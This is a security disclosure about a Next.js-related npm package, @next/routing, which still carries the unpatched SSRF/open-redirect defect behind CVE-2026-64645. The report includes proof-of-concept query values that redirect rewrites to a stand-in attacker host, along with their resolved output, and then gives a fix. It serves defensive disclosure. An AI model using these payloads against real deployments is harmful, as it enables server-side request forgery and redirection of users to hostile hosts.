# `@next/routing`: the CVE-2026-64645 destination fix was never applied to the sibling package

**Package:** `@next/routing` (npm), version **16.3.4** — the current `latest` dist-tag
**Vulnerable file:** `packages/next-routing/src/destination.ts`, `replaceDestination()`
**Class:** CWE-918 (SSRF) / CWE-601 (Open Redirect) — the same defect as **CVE-2026-64645**
**Tested against:** the **published npm tarball's `dist/index.js`**, not just repo source
**Status:** reproduced end-to-end through the package's public `resolveRoutes()` API.

## Answer to "is this the same bug as CVE-2026-64645?"

**Yes — same defect, same exploit shape, different package.** CVE-2026-64645 says: *"a rewrites()
or redirects() rule that builds its external destination hostname from request-controlled input
can be pointed at an arbitrary hostname, regardless of the rule's hostname suffix."* That is
exactly what `@next/routing` still does.

But one distinction has to be stated plainly, because it changes who is affected:

* **`next` itself is fixed** (15.5.21 / 16.2.11) and is **not** vulnerable. Nothing here reopens
  the CVE for a Next.js app.
* **`@next/routing` is a separate published package that reimplements the same logic and never
  received the fix.** It is versioned in lockstep with Next.js (`16.3.4`) and published under the
  same org, but `packages/next/` does not import it — I checked `next@16.3.4`'s dependencies
  (none matching `/rout/`) and `v16.4.0-canary.14`'s `packages/next/package.json` (references
  `@vercel/routing-utils`, not `@next/routing`).

So this is an **incomplete fix across parallel implementations**, affecting direct consumers of
`@next/routing` — not a Next.js application vulnerability. I am not claiming otherwise.

## The divergence

`next` was fixed — [`prepare-destination.ts#L267-L270`](https://github.com/vercel/next.js/blob/v16.3.4/packages/next/src/shared/lib/router/utils/prepare-destination.ts#L267-L270):

```ts
destHostnameCompiler = safeCompile(destHostname, {
  validate: false,
  encode: encodeURIComponent,   // <-- the CVE-2026-64645 fix
})
```

`@next/routing` has no equivalent — [`destination.ts#L5-L33`](https://github.com/vercel/next.js/blob/v16.3.4/packages/next-routing/src/destination.ts#L5-L33):

```ts
export function replaceDestination(
  destination: string,
  regexMatches: RegExpMatchArray | null,
  hasCaptures: Record<string, string>
): string {
  let result = destination
  if (regexMatches) {
    for (let i = 1; i < regexMatches.length; i++) {
      const value = regexMatches[i] ?? ''
      result = result.replace(new RegExp(`\\$${i}`, 'g'), value)      // L17
    }
    if (regexMatches.groups) {
      for (const [name, value] of Object.entries(regexMatches.groups)) {
        result = result.replace(new RegExp(`\\$${name}`, 'g'), value ?? '')  // L23
      }
    }
  }
  for (const [name, value] of Object.entries(hasCaptures)) {
    result = result.replace(new RegExp(`\\$${name}`, 'g'), value)     // L30  <-- the exploited one
  }
  return result
}
```

The substituted string then becomes the proxy target —
[`destination.ts#L47-L50`](https://github.com/vercel/next.js/blob/v16.3.4/packages/next-routing/src/destination.ts#L47-L50):

```ts
export function applyDestination(currentUrl: URL, destination: string): URL {
  if (isExternalDestination(destination)) {
    return new URL(destination)
  }
```

### Links

| what | link |
|---|---|
| Vulnerable `replaceDestination` | https://github.com/vercel/next.js/blob/v16.3.4/packages/next-routing/src/destination.ts#L5-L33 |
| The exploited `has`-capture loop | https://github.com/vercel/next.js/blob/v16.3.4/packages/next-routing/src/destination.ts#L28-L31 |
| `applyDestination` → `new URL()` | https://github.com/vercel/next.js/blob/v16.3.4/packages/next-routing/src/destination.ts#L47-L50 |
| Call sites in `resolveRoutes` | https://github.com/vercel/next.js/blob/v16.3.4/packages/next-routing/src/resolve-routes.ts#L93 |
| The **fixed** `next` implementation | https://github.com/vercel/next.js/blob/v16.3.4/packages/next/src/shared/lib/router/utils/prepare-destination.ts#L267-L270 |
| CVE fix commit (15.x) | https://github.com/vercel/next.js/commit/35f501357e9b0fe7c950b0d6aa8fcf5343f707e9 |
| CVE fix commit (16.x) | https://github.com/vercel/next.js/commit/d3033266c6dff23f7be71e19341fe3a8c6e2c599 |
| Advisory | https://github.com/vercel/next.js/security/advisories/GHSA-p9j2-gv94-2wf4 |

`v16.3.4` = commit `299180d3315c7ebd7b199d2b1a265b5986c5fc7d`.
`destination.ts` has only two commits in its history — `840643f207` ("Add experimental routing
package for resolving adapter routes") and `2155e07d71` — neither of which is a security fix.

## Proof (against the published npm artifact)

`npm pack @next/routing@16.3.4` → `package/dist/index.js` contains the raw substitution
(three occurrences of ``replace(new RegExp(`\\$${e}`,"g")``). The PoC calls the package's public
`resolveRoutes()`, using the advisory's own configuration shape — an external destination whose
**hostname** is built from a `has` query capture:

```js
afterFiles: [{
  sourceRegex: '^/$',
  has: [{ type: 'query', key: 'region', value: '(?<region>.+)' }],
  destination: 'https://$region.api.example.com/data',
}]
```

Literal output of `poc/poc_published_dist.js`:

```
  region="us-east"                externalRewrite=https://us-east.api.example.com/data
                          RESOLVED HOST -> us-east.api.example.com
  region="evil.example.com/"      externalRewrite=https://evil.example.com/.api.example.com/data
                          RESOLVED HOST -> evil.example.com
  region="evil.example.com#"      externalRewrite=https://evil.example.com/#.api.example.com/data
                          RESOLVED HOST -> evil.example.com
  region="evil.example.com?"      externalRewrite=https://evil.example.com/?.api.example.com/data
                          RESOLVED HOST -> evil.example.com
  region="evil.example.com\\"     externalRewrite=https://evil.example.com/.api.example.com/data
                          RESOLVED HOST -> evil.example.com
  region="x@evil.example.com"     externalRewrite=https://x@evil.example.com.api.example.com/data
                          RESOLVED HOST -> evil.example.com.api.example.com
```

Four payloads (`/`, `#`, `?`, `\`) put the resolved host entirely under attacker control, and the
result is returned as `externalRewrite` — the field a consumer proxies to. `encodeURIComponent`,
the fix already present in `next`, neutralises all four.

## A correction to my own earlier draft

My first pass unit-tested `replaceDestination()` directly with **path**-style captures and
reported those as working. Driving the real `resolveRoutes()` entry point showed that is wrong,
and I am recording it rather than quietly dropping it:

* A capture taken from the **path** is percent-encoded by `new URL()`, so `%23`/`%3F` reach
  substitution still encoded and `new URL()` then throws `Invalid URL` — no hijack.
* A typical path source regex (`[^/]+`) also cannot capture a `/`.
* The vector that actually works is the **`has` capture** (query/header/cookie), where raw
  `/ # ? \` survive untouched — which is precisely the second configuration example given in the
  advisory.

The unit test overstated reachability; the end-to-end test is the one to trust.

## Two secondary defects in the same function

1. **Replacement-pattern injection.** `value` is passed as `String.replace`'s second argument, so
   `$&`, `` $` ``, `$'`, `$1` inside an attacker-controlled value are interpreted as replacement
   patterns rather than literal text. Values should be inserted via a replacer function.
2. **Order-dependent substitution.** Numbered groups are replaced before named ones and each pass
   rewrites the whole accumulated string, so a value containing `$name` can be expanded by a later
   pass — a correctness bug that widens (1).

## Suggested fix

```ts
result = result.replace(new RegExp(`\\$${name}`, 'g'), () => encodeURIComponent(value ?? ''))
```

The replacer-function form also fixes defect (1). More durably, `@next/routing` should call the
same hardened `prepare-destination` logic `next` uses — this bug exists precisely because one
feature is implemented twice and only one copy was patched.

## Severity

I am not assigning a CVSS score. Impact is bounded by adoption of `@next/routing`, which is
described in-repo as an *"experimental routing package for resolving adapter routes"*. For any
consumer that uses it for external rewrites, the impact equals CVE-2026-64645 (CVSS 4.0 8.3 High:
SSRF for a rewrite, Open Redirect for a redirect). For everyone else it is latent.

## AI tooling disclosure

I used an AI coding assistant to read the tree, spot the divergence, and write the PoC and this
report. The transcript above is literal output from executing the published npm artifact; the
correction section exists because the first draft's reasoning was checked against a live run and
did not survive it.
